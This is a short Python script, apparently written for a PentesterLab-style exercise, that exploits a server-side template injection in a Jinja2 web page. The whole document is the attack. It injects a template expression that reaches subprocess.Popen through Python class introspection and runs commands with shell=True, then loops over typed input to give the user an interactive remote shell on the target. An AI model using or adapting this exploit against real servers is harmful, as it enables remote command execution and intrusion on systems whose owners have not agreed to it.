#!/bin/python3

import requests

url="http://ptl-d86ad682-ab04e512.libcurl.so/%7B%7B''.__class__.mro()[2].__subclasses__()[233](%22"
url_t="%22,shell=True,stdout=-1).communicate()[0]%7D%7D"

cmd=''
sesh = requests.session()
while 1:
	cmd=input('>')
	resp=sesh.get(url+cmd+url_t)
	dat=[i for i in resp.content.decode('latin-1').split('>')]
	for i in dat:
		print(i)

